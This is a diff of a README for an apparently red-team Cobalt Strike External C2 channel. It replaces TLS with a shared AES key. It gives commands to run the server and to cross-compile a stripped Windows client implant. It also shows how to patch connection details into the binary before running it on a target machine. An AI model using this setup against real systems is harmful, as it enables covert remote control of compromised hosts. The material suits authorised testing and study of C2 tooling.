@@ -5,21 +5,20 @@ This project provides a TCP-based communication channel for Cobalt Strike. This 
 To use the channel, load up Cobalt Strike and add a new External C2 listener.
 This channel is configured to run on the default Teamserver port of 2222.
 
-Requirements: Python3 (developed on 3.9.2) and wolfssl
+Requirements: Python3 (developed on 3.9.2) and PyCryptodome
 
-> pip3 install wolfssl
+> pip3 install pycryptodome
 
 To start the server, run the following command:
 
-> python3 [Name].py [Teamserver IP] [Python Server IP] [Port] [Pipename] [Cert] [Key] [OPTIONAL:-tp TeamserverPort -a Arch -r Restart]
+> python3 [Name].py [Teamserver IP] [Python Server IP] [Port] [Pipename] [Key] [OPTIONAL:-tp TeamserverPort -a Arch -r Restart]
 
 - [Name] is the name of your Python server.
 - [Teamserver IP] is the IP of your Cobalt Strike teamserver.
 - [Python Server IP] is the IP of the machine you are running server.py on. (“0.0.0.0” has been found to work on Linux machines, though it is unknown if this behavior is consistent everywhere.)
 - [Port] is the port that the server listens on to communicate with the client over. This is not the same port that the Python server uses to communicate with the teamserver.
 - [Pipename] is the name of the pipe the client creates when it runs on the target. This could be any opsec appropriate pipe name approved for ops.
-- [Cert] is the path to the servers certificate in PEM format.
-- [Key] is the path to the servers key in PEM format.
+- [Key] AES key to encrypt the beacon that is initially sent. It must be the same as the client. (128 bit is 16 characters)
 - [TeamserverPort] is the port to connect to on the Cobalt Strike teamserver. It defaults to 2222 and is an optional argument.
 - [Arch] is the architecture to request from the teamserver for the beacon. It defaults to x86 and is an optional argument.
 - [Restart] is a Y/N value to either restart the server after disconnect or exit. Default is N and is an optional argument.
@@ -28,23 +27,13 @@ Install MinGW
 
 >sudo apt install mingw-w64
 
-Install WolfSSL (need autoconf, automake, and libtool installed)
+Once you have the MinGW compiler installed, you may compile the client C code with the following command (may need full paths to .c files):
 
->git clone https://github.com/wolfSSL/wolfssl.git
->cd wolfssl
->./autogen.sh
->sudo ./configure CFLAGS="-DWIN64 -DMINGW -DWC_NO_HARDEN" --host=x86_64 CC=x86_64-w64-mingw32-gcc LD=x86_64-w64-mingw32-ld LIBS="-lws2_32 -L/usr/x86_64-w64-mingw32/lib" --prefix=/usr/x86_64-w64-mingw32 --enable-debug --enable-rsa --enable-aes --enable-static --disable-shared --disable-harden --disable-examples --disable-crypttests
->sudo make
->sudo make check
->sudo make install
-
-Once you have the MinGW compiler installed, you may compile the client C code with the following command:
-
->i686-w64-mingw32-gcc -s -O3 -fvisibility=hidden -o client.exe client.c -lws2_32 -static -lwsock32 -lwolfssl
+>i686-w64-mingw32-gcc -s -O3 -fvisibility=hidden -o client.exe client.c aes.c base64.c -lws2_32 -static -lwsock32
 
 or 64-bit with:
 
->x86_64-w64-mingw32-gcc -s -O3 -fvisibility=hidden -o client.exe client.c -lws2_32 -static -lwsock32 -lwolfssl
+>x86_64-w64-mingw32-gcc -s -O3 -fvisibility=hidden -o client.exe client.c aes.c base64.c -lws2_32 -static -lwsock32
 
 You can compile the debug version of the client with print statements by adding `-DDEBUG` to the end of the compile command
 
@@ -55,31 +44,17 @@ Move the resultant executable to your target machine, and then run it with the f
 
 Use the binary patcher to patch in arguments.
 
->python3 bipa.py [input binary] [output binary] -a [Python Server IP] -b [Port] -c [Pipename] -d [Sleep] -e [Timeout] -f [CA Cert]
+>python3 bipa.py [input binary] [output binary] -a [Python Server IP] -b [Port] -c [Pipename] -d [Sleep] -e [Timeout] -f [key]
 
 - [Python Server IP], [Port], and [Pipename] must be the same as the ones passed to server.py.
 - [Sleep] is the sleep time (in seconds) to wait between check ins with the server. It hits this sleep when the beacon indicates it has nothing left to send back to the server and is just checking in.
 - [Timeout] is the send/recv socket timeout option (in seconds) set by setsockopt(). May remove in future.
-- [CA Cert] is the CA Cert created when creating the server cert and key. It is copy and pasted in with quotes around it, not a file path.
+- [key] AES key to encrypt the beacon that is initially sent. It must be the same as the client.
 
 ## CONSTRAINTS AND NOTES
 
 - This channel expects only one client per instance of server.py. Multiple clients communicating with the same server requires multiple instances of server.py running on different ports.
 - The client keeps one long TCP/TLS connection open.
-- Create certs. Server gets server-cert.pem and server-key.pem. Client gets ca-cert.pem
-
->openssl genrsa 2048 > ca-key.pem
->openssl req -new -x509 -nodes -days 365000 -key ca-key.pem -out ca-cert.pem
->openssl req -newkey rsa:2048 -nodes -days 365000 -keyout server-key.pem -out server-req.pem
->openssl x509 -req -days 365000 -set_serial 01 -in server-req.pem -out server-cert.pem -CA ca-cert.pem -CAkey ca-key.pem
-
-- Steps I used to set up wolfssl on kali once cloned
-
-> make distclean
-> ./autogen.sh
-> sudo ./configure CFLAGS="-DWIN64 -DMINGW -DWC_NO_HARDEN" --enable-debug --enable-rsa --enable-aes --enable-static --disable-shared --enable-dtls --host=x86_64 CC=x86_64-w64-mingw32-gcc LD=x86_64-w64-mingw32-ld LIBS="-lws2_32 -L/usr/x86_64-w64-mingw/lib -lwolfssl" --prefix=/usr/x86_64-w64-mingw32 --disable-harden --disable-examples
-> sudo make
-> sudo make install
 
 ## TODOS/IMPROVEMENTS
 
